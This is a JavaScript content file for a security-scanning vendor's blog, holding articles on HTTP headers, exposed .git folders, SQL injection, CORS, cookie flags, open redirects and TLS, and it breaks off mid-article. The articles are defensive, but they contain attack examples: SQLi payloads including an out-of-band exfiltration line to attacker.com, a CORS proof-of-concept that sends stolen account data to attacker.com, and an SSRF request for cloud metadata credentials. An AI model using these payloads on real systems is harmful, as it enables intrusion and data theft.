// ─── Post metadata (used by BlogPage listing) ─────────────────────────────────
export const POSTS = [
  // ── New long-form articles ──────────────────────────────────────────────────
  {
    slug: 'http-security-headers-guide',
    title: 'HTTP Security Headers: The Complete 2026 Guide',
    excerpt: 'Content-Security-Policy, HSTS, X-Frame-Options, and three more headers that stop the most common web attacks. Configuration examples for Nginx, Apache, and Node.js.',
    category: 'How-To',
    readTime: '7 min read',
    date: '2026-06-02',
    author: 'Udyo360 Team',
    tags: ['Headers', 'CSP', 'HSTS', 'Hardening'],
    featured: true,
  },
  {
    slug: 'exposed-git-folder-vulnerability',
    title: 'Exposed .git Folder: How Attackers Steal Your Entire Codebase',
    excerpt: "A forgotten .git directory can expose source code, credentials, and history to anyone with a browser. How it happens, how to detect it, and how to rotate compromised secrets.",
    category: 'Vulnerability Deep-Dive',
    readTime: '6 min read',
    date: '2026-05-28',
    author: 'Udyo360 Team',
    tags: ['Git', 'Exposure', 'Secrets', 'Hardening'],
  },
  {
    slug: 'sql-injection-still-dangerous-2026',
    title: 'SQL Injection in 2026: Still the #1 Data Breach Vector',
    excerpt: "Despite being well understood for over two decades, SQLi continues to top breach reports. Why it persists, all four attack types, ORM pitfalls, and how to find it before attackers do.",
    category: 'Vulnerability Deep-Dive',
    readTime: '8 min read',
    date: '2026-05-22',
    author: 'Udyo360 Team',
    tags: ['SQLi', 'OWASP', 'Injection', 'ORM'],
  },
  {
    slug: 'cors-misconfiguration-explained',
    title: 'CORS Misconfiguration: 4 Mistakes That Let Attackers Read Your API',
    excerpt: 'Wildcard with credentials, reflected origin, null origin, and regex bypass — four CORS misconfigs with live attack code and the correct config for each.',
    category: 'Vulnerability Deep-Dive',
    readTime: '7 min read',
    date: '2026-05-19',
    author: 'Udyo360 Team',
    tags: ['CORS', 'API Security', 'Misconfiguration'],
  },
  {
    slug: 'secure-cookie-flags-guide',
    title: 'Secure Cookie Flags: HttpOnly, Secure, and SameSite Explained',
    excerpt: 'Three flags — HttpOnly, Secure, and SameSite — determine whether session cookies can be stolen by XSS, intercepted over HTTP, or abused in CSRF attacks. Config for every major framework.',
    category: 'How-To',
    readTime: '6 min read',
    date: '2026-05-15',
    author: 'Udyo360 Team',
    tags: ['Cookies', 'CSRF', 'Sessions', 'XSS'],
  },
  {
    slug: 'open-redirect-vulnerability-guide',
    title: 'Open Redirects: From "Low Severity" to Account Takeover',
    excerpt: 'Open redirects look harmless in isolation. Chained with OAuth flows, password reset links, or SSRF — they become critical. Phishing kill-chains, OAuth bypass, and the correct fix.',
    category: 'Vulnerability Deep-Dive',
    readTime: '7 min read',
    date: '2026-05-10',
    author: 'Udyo360 Team',
    tags: ['Open Redirect', 'OAuth', 'SSRF', 'Phishing'],
  },
  {
    slug: 'tls-ssl-misconfiguration-guide',
    title: 'TLS/SSL Misconfiguration: Protocol Versions, Ciphers, and Mixed Content',
    excerpt: "HTTPS doesn't mean secure. Protocol versions, cipher suites, mixed content, and certificate issues all determine whether your TLS deployment actually protects data in transit.",
    category: 'How-To',
    readTime: '8 min read',
    date: '2026-05-06',
    author: 'Udyo360 Team',
    tags: ['TLS', 'SSL', 'HTTPS', 'Ciphers'],
  },
  {
    slug: 'continuous-security-scanning-vs-manual-testing',
    title: 'Continuous Security Scanning vs Manual Pen Testing: When to Use Each',
    excerpt: 'Automated scanners find known patterns across your entire attack surface. Manual testers find logic flaws no scanner ever will. Here is how to combine both for a complete strategy.',
    category: 'Security Research',
    readTime: '7 min read',
    date: '2026-04-30',
    author: 'Udyo360 Team',
    tags: ['Strategy', 'Pen Testing', 'Automation', 'DevSecOps'],
  },
  // ── Existing posts ────────────────────────────────────────────────────────
  {
    slug: 'owasp-top-10-2026',
    title: 'OWASP Top 10 2025: What Changed and How to Stay Secure',
    excerpt: 'The latest OWASP Top 10 brings updated rankings and new vulnerability categories. We break down each risk and show you how Udyo360 maps to every item on the list.',
    category: 'Security Research',
    readTime: '8 min read',
    date: '2026-05-15',
    author: 'Udyo360 Team',
    tags: ['OWASP', 'Web Security', 'Best Practices'],
  },
  {
    slug: 'security-scanning-cicd-pipeline',
    title: 'Integrating Security Scanning into Your CI/CD Pipeline',
    excerpt: 'Shift security left by running automated vulnerability scans on every pull request. Step-by-step guide for GitHub Actions, GitLab CI, and Jenkins.',
    category: 'DevSecOps',
    readTime: '10 min read',
    date: '2026-04-29',
    author: 'Udyo360 Team',
    tags: ['CI/CD', 'DevSecOps', 'Automation'],
  },
  {
    slug: 'api-security-checklist',
    title: 'API Security Checklist: 15 Things to Test Before Going Live',
    excerpt: 'REST and GraphQL APIs are a common attack surface. This checklist covers authentication, rate limiting, data exposure, and more — with actionable tests for each.',
    category: 'How-To',
    readTime: '12 min read',
    date: '2026-04-05',
    author: 'Udyo360 Team',
    tags: ['API Security', 'Checklist', 'Testing'],
  },
  {
    slug: 'understanding-cvss-scores',
    title: 'Understanding CVSS Scores: A Practical Guide for Developers',
    excerpt: 'CVSS scores tell you how severe a vulnerability is — but do you know how to read them? We explain Base, Temporal, and Environmental metrics with real-world examples.',
    category: 'Security Research',
    readTime: '5 min read',
    date: '2026-03-22',
    author: 'Udyo360 Team',
    tags: ['CVSS', 'CVE', 'Risk Management'],
  },
]

// ─── Full article content keyed by slug ───────────────────────────────────────
export const ARTICLE_CONTENT = {

  'http-security-headers-guide': {
    blocks: [
      { type: 'p', text: 'HTTP response headers are instructions from your server to the browser. When security headers are missing or misconfigured, you leave the browser with no guidance on how to protect users — XSS payloads execute, clickjacking frames load, and connections silently downgrade to HTTP. Six headers do most of the work.' },
      { type: 'h2', text: '1. Content-Security-Policy (CSP)' },
      { type: 'p', text: 'CSP lets you whitelist which scripts, styles, images, and other resources the browser may load. A violated CSP prevents injected scripts from executing even when an XSS flaw exists.' },
      { type: 'code', lang: 'http', label: 'Recommended CSP header', code: `Content-Security-Policy: default-src 'self';
  script-src 'self' https://cdn.example.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  frame-ancestors 'none';
  upgrade-insecure-requests` },
      { type: 'callout', variant: 'danger', title: 'Avoid unsafe-inline in script-src', text: "**`unsafe-inline`** and **`unsafe-eval`** neuter CSP's XSS protection entirely. Use nonces (`'nonce-RANDOM'`) or hashes instead." },
      { type: 'h2', text: '2. HTTP Strict Transport Security (HSTS)' },
      { type: 'p', text: 'HSTS tells browsers to always use HTTPS, eliminating SSL-stripping attacks where a network attacker downgrades your connection to plain HTTP.' },
      { type: 'code', lang: 'http', label: 'HSTS header', code: `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload` },
      { type: 'callout', variant: 'warning', title: 'Preload carefully', text: 'Do not set `preload` until **every subdomain** serves valid HTTPS. Preloaded domains are extremely hard to remove and will break HTTP subdomains for all users.' },
      { type: 'h2', text: '3. X-Frame-Options' },
      { type: 'p', text: 'Prevents your page from being embedded in an iframe — closing the clickjacking attack vector where an attacker overlays an invisible frame on a legitimate button.' },
      { type: 'code', lang: 'http', label: 'X-Frame-Options header', code: `X-Frame-Options: DENY` },
      { type: 'h2', text: '4. X-Content-Type-Options' },
      { type: 'p', text: 'Forces browsers to respect the declared `Content-Type` and prevents MIME-sniffing attacks, where a browser guesses a file type and executes an uploaded HTML file as a script.' },
      { type: 'code', lang: 'http', label: 'Prevent MIME sniffing', code: `X-Content-Type-Options: nosniff` },
      { type: 'h2', text: '5. Referrer-Policy' },
      { type: 'p', text: 'Controls how much of the URL is sent in the `Referer` header when users navigate away. Without this header, internal URLs, tokens in query strings, and admin paths can leak to third-party sites.' },
      { type: 'code', lang: 'http', label: 'Referrer-Policy', code: `Referrer-Policy: strict-origin-when-cross-origin` },
      { type: 'h2', text: '6. Permissions-Policy' },
      { type: 'p', text: "Restricts which browser features (camera, microphone, geolocation, payment) your page can access. Even if an XSS payload runs, it can't silently activate the camera." },
      { type: 'code', lang: 'http', label: 'Permissions-Policy', code: `Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()` },
      { type: 'h2', text: 'Setting All Six Headers' },
      { type: 'code', lang: 'nginx', label: 'Nginx', code: `add_header Content-Security-Policy "default-src 'self'; frame-ancestors 'none'; upgrade-insecure-requests" always;
add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;
add_header X-Frame-Options "DENY" always;
add_header X-Content-Type-Options "nosniff" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Permissions-Policy "camera=(), microphone=(), geolocation=()" always;` },
      { type: 'code', lang: 'apache', label: 'Apache (.htaccess)', code: `Header always set Content-Security-Policy "default-src 'self'; frame-ancestors 'none'"
Header always set Strict-Transport-Security "max-age=63072000; includeSubDomains; preload"
Header always set X-Frame-Options "DENY"
Header always set X-Content-Type-Options "nosniff"
Header always set Referrer-Policy "strict-origin-when-cross-origin"
Header always set Permissions-Policy "camera=(), microphone=(), geolocation=()"` },
      { type: 'code', lang: 'js', label: 'Express.js (helmet)', code: `import helmet from 'helmet'

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      frameAncestors: ["'none'"],
      upgradeInsecureRequests: [],
    },
  },
  hsts: { maxAge: 63072000, includeSubDomains: true, preload: true },
}))` },
      { type: 'callout', variant: 'tip', title: 'Get your header score in 60 seconds', text: 'Run a free scan with Udyo360 to see which headers are missing, which are misconfigured, and get a prioritised fix list with exact header values for your stack.' },
    ],
  },

  'exposed-git-folder-vulnerability': {
    blocks: [
      { type: 'p', text: "When you deploy a web app, your web root sometimes contains a `.git` directory with the full commit history. If your web server serves that directory publicly, an attacker can reconstruct your entire source tree — including hardcoded credentials, API keys, and historical secrets you thought were deleted." },
      { type: 'h2', text: 'How It Happens' },
      { type: 'p', text: 'The most common cause is a deploy-by-git-clone workflow. Developers clone the repo directly into the document root and forget that `.git` comes along.' },
      { type: 'steps', items: [
        'Developer clones: `git clone https://github.com/org/app /var/www/html`',
        'Web server serves all files under `/var/www/html/` including `/.git/`',
        'Attacker fetches `https://example.com/.git/config` — receives a valid git config file',
        'Attacker runs `git-dumper` to reconstruct the full repository locally',
        'Attacker reads source code, `.env` files, and full commit history',
      ]},
      { type: 'h2', text: 'What Attackers Extract' },
      { type: 'bullets', items: [
        'Entire source code including business logic and internal API routes',
        'Hardcoded database credentials and connection strings',
        'API keys committed to history — even if later removed, they exist in past commits',
        '`.env` files committed by mistake during development',
        'Internal hostnames, IP addresses, and service endpoints',
        'S3 bucket names, GCP project IDs, AWS ARNs',
      ]},
      { type: 'h2', text: 'Quick Detection Test' },
      { type: 'code', lang: 'bash', label: 'Check if exposed', code: `# 200 = exposed, 403/404 = protected
curl -s -o /dev/null -w "%{http_code}" https://example.com/.git/config` },
      { type: 'callout', variant: 'danger', title: 'This is a P1 Critical finding', text: 'A 200 response for `/.git/config` means treat it as a **full credential compromise**. Rotate every secret immediately — do not wait for confirmation of actual exploitation.' },
      { type: 'h2', text: 'Blocking Access — Web Server Config' },
      { type: 'code', lang: 'nginx', label: 'Nginx', code: `location ~ /\\.git {
    deny all;
    return 404;
}` },
      { type: 'code', lang: 'apache', label: 'Apache (.htaccess)', code: `<DirectoryMatch "^\\/.*\\.git\\/">
    Require all denied
</DirectoryMatch>` },
      { type: 'code', lang: 'caddy', label: 'Caddyfile', code: `@dotgit path_regexp \\.git
respond @dotgit 404` },
      { type: 'h2', text: 'Credential Rotation Checklist' },
      { type: 'steps', items: [
        "Find all secrets in history: `git log --all --full-history -p | grep -E 'password|secret|api_key|token'`",
        'Rotate every secret found — database passwords, API keys, OAuth secrets, JWT signing keys',
        'Revoke and reissue tokens in each provider dashboard (AWS IAM, GitHub, Stripe, Cloudflare, etc.)',
        'If customer data was potentially accessible, begin your breach notification assessment',
        'Re-deploy using a CI/CD pipeline that copies build artifacts rather than the raw git checkout',
        "Remove `.git` from the document root or add it to your deploy exclusion list",
      ]},
      { type: 'callout', variant: 'warning', title: 'History purge is not enough', text: 'Use `git filter-repo` to purge secrets from history. But once data was publicly accessible, the history is compromised regardless. Always rotate — never rely on erasure alone.' },
      { type: 'callout', variant: 'tip', title: 'Prevent recurrence', text: 'Udyo360 checks for `.git` exposure on every scan. Enable continuous scanning to catch this class of misconfiguration before it reaches production.' },
    ],
  },

  'sql-injection-still-dangerous-2026': {
    blocks: [
      { type: 'p', text: "SQL injection was first documented in 1998. In 2026 it remains in the OWASP Top 10 and continues to drive some of the largest data breaches every year. Why? Because ORMs create a false sense of security, parameterisation is skipped under time pressure, and legacy codebases accumulate raw query strings over years of growth." },
      { type: 'h2', text: 'The Four Types of SQL Injection' },
      { type: 'h3', text: '1. Classic (In-Band)' },
      { type: 'p', text: 'The application returns query results or error messages directly in the HTTP response. The simplest variant and trivial to exploit manually.' },
      { type: 'code', lang: 'http', label: 'Classic SQLi request', code: `GET /users?id=1 OR 1=1--
→ Returns all user rows

GET /users?id=1' AND '1'='1
→ Same result, different quoting style` },
      { type: 'h3', text: '2. Blind Boolean-Based' },
      { type: 'p', text: 'No data is returned directly, but the response changes (status code, content length, or specific text) based on whether a condition is true or false.' },
      { type: 'code', lang: 'http', label: 'Boolean blind request', code: `GET /users?id=1 AND SUBSTRING(password,1,1)='a'
→ 200 OK with normal content  = first char is 'a'
→ 500 Error / empty response  = first char is not 'a'

# Automated with sqlmap:
sqlmap -u "https://example.com/users?id=1" --level=3 --risk=2` },
      { type: 'h3', text: '3. Time-Based Blind' },
      { type: 'p', text: "The application doesn't change its response content, but you can infer data by measuring how long the response takes. Exploitable even when error messages are fully suppressed." },
      { type: 'code', lang: 'sql', label: 'Time-based blind (MSSQL)', code: `'; IF (SELECT COUNT(*) FROM users) > 0 WAITFOR DELAY '0:0:5'--
-- Response delays 5 seconds → users table exists and has rows` },
      { type: 'h3', text: '4. Out-of-Band' },
      { type: 'p', text: 'Data is exfiltrated through a different channel — DNS lookups or HTTP requests initiated by the database server. Works when the app returns nothing useful at all.' },
      { type: 'code', lang: 'sql', label: 'Out-of-band (MSSQL xp_dirtree)', code: `'; EXEC xp_dirtree '//attacker.com/'+SUBSTRING(password,1,10)+'/'--
-- Database server makes a DNS/SMB request to attacker.com
-- The subdomain path contains exfiltrated data` },
      { type: 'callout', variant: 'warning', title: 'Blind and OOB bypass WAFs', text: 'Most WAF rules focus on classic SQLi patterns. Time-based and out-of-band attacks are far harder to detect and are the preferred method of professional attackers against hardened targets.' },
      { type: 'h2', text: 'ORM Pitfalls' },
      { type: 'p', text: 'ORMs like SQLAlchemy, Hibernate, and Sequelize are not inherently safe. Raw query escapes appear frequently in real codebases.' },
      { type: 'code', lang: 'js', label: 'Sequelize — vulnerable vs safe', code: `// Vulnerable — direct interpolation
await db.query(\`SELECT * FROM users WHERE name = '\${req.query.name}'\`)

// Safe — named replacements
await db.query('SELECT * FROM users WHERE name = :name', {
  replacements: { name: req.query.name },
  type: QueryTypes.SELECT,
})` },
      { type: 'code', lang: 'python', label: 'SQLAlchemy — vulnerable vs safe', code: `# Vulnerable — f-string in text()
result = db.execute(text(f"SELECT * FROM users WHERE email = '{email}'"))

# Safe — bound parameters
result = db.execute(
    text("SELECT * FROM users WHERE email = :email"),
    {"email": email}
)` },
      { type: 'callout', variant: 'warning', title: 'LIKE clauses are also injectable', text: '`LIKE` clauses with user input remain vulnerable even with parameterised queries. The `%` and `_` wildcard characters must be escaped separately before binding.' },
      { type: 'h2', text: 'Defence in Depth' },
      { type: 'bullets', items: [
        '**Parameterised queries everywhere** — no exceptions, no interpolation, not even for table names',
        'Least-privilege DB accounts — app account has no `DROP`, `CREATE`, `GRANT` permissions',
        'WAF rules for SQLi patterns — mod_security CRS or Cloudflare WAF',
        'Never return raw SQL error messages to the client',
        'Audit stored procedures — they often contain dynamic SQL and are routinely overlooked',
        'Use `sqlmap` or Udyo360 scans in CI to catch regressions before production',
      ]},
      { type: 'callout', variant: 'tip', title: 'All four types in one scan', text: 'Udyo360 tests for classic, boolean-blind, time-based, and out-of-band SQLi across every parameter in every endpoint — including JSON body parameters and HTTP headers.' },
    ],
  },

  'cors-misconfiguration-explained': {
    blocks: [
      { type: 'p', text: "CORS (Cross-Origin Resource Sharing) is the browser mechanism that controls which origins can read responses from your API. A misconfigured CORS policy can allow a malicious website to make authenticated requests to your API on behalf of a logged-in user and read the response — completely bypassing the same-origin policy." },
      { type: 'h2', text: 'What CORS Actually Does' },
      { type: 'p', text: 'When your API includes the following headers, it tells the browser that `app.example.com` is allowed to read cross-origin responses — including those sent with cookies:' },
      { type: 'code', lang: 'http', label: 'Correct CORS response headers', code: `Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Credentials: true
Vary: Origin` },
      { type: 'h2', text: 'The Four Dangerous Misconfigurations' },
      { type: 'h3', text: '1. Wildcard with Credentials' },
      { type: 'code', lang: 'http', label: 'Broken config', code: `Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true` },
      { type: 'callout', variant: 'danger', title: 'Browsers reject this — but the intent is wrong', text: "Browsers block wildcard + credentials together, but some frameworks fall through to insecure defaults. The intent — any origin with authentication — is the misconfiguration you're trying to prevent." },
      { type: 'h3', text: '2. Reflecting the Request Origin Blindly' },
      { type: 'code', lang: 'js', label: 'Vulnerable Express middleware', code: `// Vulnerable — echoes any origin
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', req.headers.origin)
  res.header('Access-Control-Allow-Credentials', 'true')
  next()
})` },
      { type: 'p', text: "An attacker at `https://evil.com` sends a preflight. Your server reflects `evil.com` in the CORS header. Their JavaScript can now read the response body — including session data, API tokens, and PII." },
      { type: 'h3', text: '3. Null Origin Accepted' },
      { type: 'code', lang: 'http', label: 'Null origin — never allow', code: `Access-Control-Allow-Origin: null` },
      { type: 'p', text: 'The `null` origin is sent by sandboxed iframes, `data:` URIs, and local HTML files. Accepting it allows any page to construct a sandboxed iframe and call your API with credentials.' },
      { type: 'h3', text: '4. Regex with a Bypass' },
      { type: 'code', lang: 'js', label: 'Vulnerable regex origin check', code: `// Dot matches any character — evilexample.com bypasses this
if (/^https:\\/\\/.*example\\.com$/.test(origin)) {
  res.header('Access-Control-Allow-Origin', origin)
}` },
      { type: 'p', text: 'An attacker registers `evilexample.com`. The unescaped `.` in the regex matches it. Their origin is allowlisted.' },
      { type: 'h2', text: 'Live Attack Proof of Concept' },
      { type: 'code', lang: 'html', label: 'attacker.com/steal.html', code: `<script>
fetch('https://api.victim.com/account', { credentials: 'include' })
  .then(r => r.json())
  .then(data => {
    // Silently exfiltrate the victim's account data
    fetch('https://attacker.com/log?d=' + encodeURIComponent(JSON.stringify(data)))
  })
</script>` },
      { type: 'callout', variant: 'danger', title: 'Any website can silently read authenticated responses', text: 'If this PoC works, every website the victim visits while logged in to your app can silently read their account data, extract their API keys, or act on their behalf.' },
      { type: 'h2', text: 'Correct CORS Configuration' },
      { type: 'code', lang: 'js', label: 'Safe Express CORS middleware', code: `const ALLOWED_ORIGINS = new Set([
  'https://app.example.com',
  'https://admin.example.com',
])

app.use((req, res, next) => {
  const origin = req.headers.origin
  if (ALLOWED_ORIGINS.has(origin)) {
    res.header('Access-Control-Allow-Origin', origin)
    res.header('Access-Control-Allow-Credentials', 'true')
    res.header('Vary', 'Origin') // Required for CDN correctness
  }
  next()
})` },
      { type: 'callout', variant: 'tip', title: 'Always set Vary: Origin', text: 'When you dynamically set `Access-Control-Allow-Origin`, include `Vary: Origin`. Without it, a CDN may cache the wrong origin in the header and serve it to other users.' },
      { type: 'callout', variant: 'tip', title: 'Scan your CORS config', text: 'Udyo360 tests all four CORS misconfigurations on every API endpoint, including null-origin and regex bypass checks that manual testers routinely miss.' },
    ],
  },

  'secure-cookie-flags-guide': {
    blocks: [
      { type: 'p', text: 'Cookies are the primary way web apps maintain session state. Three flags — `HttpOnly`, `Secure`, and `SameSite` — determine whether cookies can be stolen by XSS, intercepted over HTTP, or submitted by third-party requests. All three should be set on every authentication cookie.' },
      { type: 'h2', text: 'HttpOnly — Block XSS Theft' },
      { type: 'p', text: '`HttpOnly` prevents JavaScript from reading the cookie via `document.cookie`. Even if an attacker injects a script, they cannot exfiltrate the session token. It does not prevent the cookie from being sent with requests.' },
      { type: 'code', lang: 'http', label: 'Correct Set-Cookie header', code: `Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=86400` },
      { type: 'callout', variant: 'warning', title: 'HttpOnly is not a complete XSS defence', text: '`HttpOnly` only prevents JavaScript **read** access. An attacker with XSS can still use the cookie by issuing authenticated requests from the victim\'s browser — they just cannot steal the token value itself.' },
      { type: 'h2', text: 'Secure — HTTPS Only' },
      { type: 'p', text: 'The `Secure` flag ensures the cookie is never sent over plain HTTP. Without it, an attacker performing a network MITM — on public Wi-Fi, for example — can capture session cookies even if your server redirects HTTP to HTTPS, because the very first HTTP request leaks the cookie.' },
      { type: 'h2', text: 'SameSite — CSRF Defence' },
      { type: 'p', text: '`SameSite` controls whether the cookie is included in cross-origin requests.' },
      { type: 'bullets', items: [
        '**`Strict`** — Never sent cross-origin, not even when following a link from another site. Strongest protection. May break some OAuth and external link flows.',
        '**`Lax`** — Sent on top-level navigations (clicking a link) but not on subresource requests (fetch, img, iframe). Good default for session cookies.',
        '**`None`** — Sent on all requests including cross-origin. **Requires `Secure`**. Only use for intentional cross-site embedding such as payment widgets.',
      ]},
      { type: 'callout', variant: 'danger', title: 'SameSite=None without CSRF tokens is risky', text: '`SameSite=None; Secure` still sends the cookie on cross-origin POSTs. Use CSRF tokens alongside `SameSite=Lax` for defence in depth on state-changing endpoints.' },
      { type: 'h2', text: 'Per-Framework Configuration' },
      { type: 'code', lang: 'js', label: 'Express.js', code: `res.cookie('session', token, {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production',
  sameSite: 'lax',
  maxAge: 86400_000, // 1 day in ms
})` },
      { type: 'code', lang: 'python', label: 'Django (settings.py)', code: `SESSION_COOKIE_HTTPONLY = True
SESSION_COOKIE_SECURE = True      # Requires HTTPS in production
SESSION_COOKIE_SAMESITE = 'Lax'
CSRF_COOKIE_HTTPONLY = True
CSRF_COOKIE_SECURE = True` },
      { type: 'code', lang: 'yaml', label: 'Spring Boot (application.yml)', code: `server:
  servlet:
    session:
      cookie:
        http-only: true
        secure: true
        same-site: lax` },
      { type: 'code', lang: 'php', label: 'Laravel (config/session.php)', code: `'http_only'  => true,
'secure'     => env('SESSION_SECURE_COOKIE', true),
'same_site'  => 'lax',` },
      { type: 'callout', variant: 'tip', title: 'Check your cookies automatically', text: 'Udyo360 flags missing `HttpOnly`, `Secure`, and `SameSite` flags on all cookies set by your application — including third-party authentication flows.' },
    ],
  },

  'open-redirect-vulnerability-guide': {
    blocks: [
      { type: 'p', text: 'An open redirect is a flaw where your application redirects users to a URL supplied by the attacker. Alone it earns a "Low" CVSS score. Chained with OAuth flows, password reset links, or server-side fetch — it becomes critical.' },
      { type: 'h2', text: 'What It Looks Like' },
      { type: 'code', lang: 'http', label: 'Open redirect request', code: `GET /login?next=https://evil.com HTTP/1.1
Host: legitimate-bank.com

HTTP/1.1 302 Found
Location: https://evil.com` },
      { type: 'p', text: 'The victim sees `legitimate-bank.com/login` in their URL bar. They click "Log in" and land on a phishing page that looks identical to the real login form.' },
      { type: 'callout', variant: 'warning', title: 'Highest-value targets', text: "Open redirects in **password-reset flows**, **OAuth login endpoints**, and **'return to' parameters** are highest priority — victims are already in an authentication mindset and far more likely to enter credentials." },
      { type: 'h2', text: 'Phishing Kill-Chain' },
      { type: 'steps', items: [
        'Attacker identifies `https://app.example.com/auth?redirect=...`',
        'Constructs: `https://app.example.com/auth?redirect=https://evil-example.com/fake-login`',
        'Sends phishing email with the legitimate-looking URL',
        'Victim completes "login", credentials are captured by attacker',
        'Attacker silently redirects victim back to real app — victim suspects nothing',
      ]},
      { type: 'h2', text: 'OAuth Authorization Code Steal' },
      { type: 'p', text: 'Many OAuth servers validate `redirect_uri` with a prefix match or allow any subdomain. An open redirect on a whitelisted domain creates an authorization code exfiltration path.' },
      { type: 'code', lang: 'http', label: 'OAuth redirect abuse', code: `GET /oauth/authorize
  ?client_id=app
  &redirect_uri=https://app.example.com/callback?next=https://evil.com
  &response_type=code
  &scope=read

# Authorization code lands at app.example.com/callback
# App follows 'next' param → redirects to evil.com
# Authorization code visible in Referer header at evil.com` },
      { type: 'callout', variant: 'danger', title: 'Low severity becomes account takeover', text: 'This turns a Low-severity redirect into a full account takeover via OAuth code theft. OWASP explicitly lists this as a high-risk OAuth misconfiguration.' },
      { type: 'h2', text: 'Chaining to SSRF' },
      { type: 'p', text: 'When apps use redirect URLs server-side (webhook validation, OAuth callbacks), an open redirect can pivot to SSRF:' },
      { type: 'code', lang: 'http', label: 'Open redirect → SSRF pivot', code: `POST /api/webhook/test
Content-Type: application/json

{"url": "https://app.example.com/redirect?to=http://169.254.169.254/latest/meta-data/"}

# Server follows the redirect → hits AWS metadata service
# Attacker receives IAM credentials in the webhook test response` },
      { type: 'h2', text: 'Safe Redirect Implementation' },
      { type: 'code', lang: 'js', label: 'Allowlist-based redirect helper', code: `// Allowlist of valid post-login destinations
const SAFE_PATHS = new Set(['/dashboard', '/settings', '/billing', '/scan'])

function safeRedirect(res, next) {
  // Only allow relative paths on our own origin
  const dest = SAFE_PATHS.has(next) ? next : '/dashboard'
  res.redirect(dest)
}

// Never pass full URLs from user input to res.redirect()` },
      { type: 'bullets', items: [
        "Validate redirect URLs against an **exact allowlist** — not prefix match, not regex",
        "Reject any URL with a scheme other than your own origin (`javascript:`, `data:`, `http:`)",
        "For OAuth: use **exact-match** `redirect_uri` comparison on the authorization server",
        "Never use client-supplied URLs for server-side fetch or curl operations",
      ]},
      { type: 'callout', variant: 'tip', title: 'Scan for open redirects', text: 'Udyo360 tests redirect parameters in login, logout, OAuth, and password-reset flows — including chained redirect-to-SSRF checks.' },
    ],
  },

  'tls-ssl-misconfiguration-guide': {
    blocks: [
      { type: 'p', text: "HTTPS doesn't mean secure. The protocol version, cipher suite, certificate configuration, and mixed-content handling all determine whether your TLS deployment actually protects data in transit. A badly configured TLS stack can still be broken by BEAST, POODLE, DROWN, ROBOT, and CRIME — all exploitable in 2026 on legacy servers." },
      { type: 'h2', text: 'Protocol Versions' },
      { type: 'bullets', items: [
        '**SSLv3** — Broken (POODLE, 2014). Disable on all servers, no exceptions.',
        '**TLS 1.0** — Broken (BEAST, POODLE-TLS). Disabled by PCI-DSS since June 2018.',
        '**TLS 1.1** — Deprecated by RFC 8996. Disable.',
        '**TLS 1.2** — Still acceptable with modern AEAD cipher suites. Minimum for legacy client support.',
        '**TLS 1.3** — Current standard. Forward secrecy by default, smaller attack surface. Enable.',
      ]},
      { type: 'code', lang: 'nginx', label: 'Nginx — TLS 1.2 + 1.3 only', code: `ssl_protocols TLSv1.2 TLSv1.3;
ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305;
ssl_prefer_server_ciphers off;  # Let TLS 1.3 clients choose` },
      { type: 'h2', text: 'Cipher Suites to Disable' },
      { type: 'bullets', items: [
        '**RC4** — Stream cipher broken since 2013 (RC4 NOMORE attack)',
        '**3DES / DES** — Broken by SWEET32 (CVE-2016-2183). Birthday attack on 64-bit blocks.',
        '**NULL ciphers** — No encryption, only authentication. Traffic is plaintext.',
        '**EXPORT ciphers** — Deliberately weakened (FREAK, Logjam). 40-56 bit key lengths.',
        '**Anonymous ciphers** — No server authentication. Trivially man-in-the-middled.',
      ]},
      { type: 'callout', variant: 'danger', title: 'Check your load balancer and CDN', text: 'Even if your origin server has strong ciphers, your load balancer, CDN edge nodes, or SSL-terminating proxy may accept weak protocols and override your settings. Test the full chain.' },
      { type: 'h2', text: 'Mixed Content' },
      { type: 'p', text: 'Mixed content occurs when an HTTPS page loads resources over HTTP. Browsers block active mixed content (scripts, iframes) and warn on passive (images, video). Both degrade user security.' },
      { type: 'code', lang: 'html', label: 'Fix mixed content in templates', code: `<!-- Vulnerable -->
<script src="http://cdn.example.com/app.js"></script>

<!-- Fixed — explicit HTTPS -->
<script src="https://cdn.example.com/app.js"></script>

<!-- Fixed — protocol-relative (inherits page scheme) -->
<script src="//cdn.example.com/app.js"></script>` },
      { type: 'p', text: 'Add `upgrade-insecure-requests` to your CSP to automatically upgrade remaining HTTP sub-resources:' },
      { type: 'code', lang: 'http', label: 'CSP upgrade directive', code: `Content-Security-Policy: upgrade-insecure-requests` },
      { type: 'h2', text: 'Certificate Issues' },
      { type: 'bullets', items: [
        '**Expired certificates** — Monitor with automated alerts 30 days before expiry. Certificate expiry causes hard browser errors for all users.',
        '**Self-signed certificates** — Only valid in development. Browsers reject them in production.',
        '**Incomplete chains** — Include all intermediate CA certificates in your server bundle.',
        '**Weak keys** — Minimum RSA 2048 bits; prefer ECDSA P-256 for better performance.',
        '**Wildcard overuse** — A compromised wildcard certificate exposes all subdomains.',
      ]},
      { type: 'code', lang: 'nginx', label: 'Nginx — OCSP stapling', code: `ssl_stapling on;
ssl_stapling_verify on;
resolver 8.8.8.8 1.1.1.1 valid=300s;
resolver_timeout 5s;` },
      { type: 'h2', text: 'Quick Command-Line TLS Audit' },
      { type: 'code', lang: 'bash', label: 'Test TLS 1.0 availability', code: `# Should return error / "no peer certificate" if TLS 1.0 is disabled
openssl s_client -connect example.com:443 -tls1 2>&1 | grep -E "Protocol|CONNECTED"

# Full TLS audit with testssl.sh
./testssl.sh --severity HIGH example.com

# Or check with nmap
nmap --script ssl-enum-ciphers -p 443 example.com` },
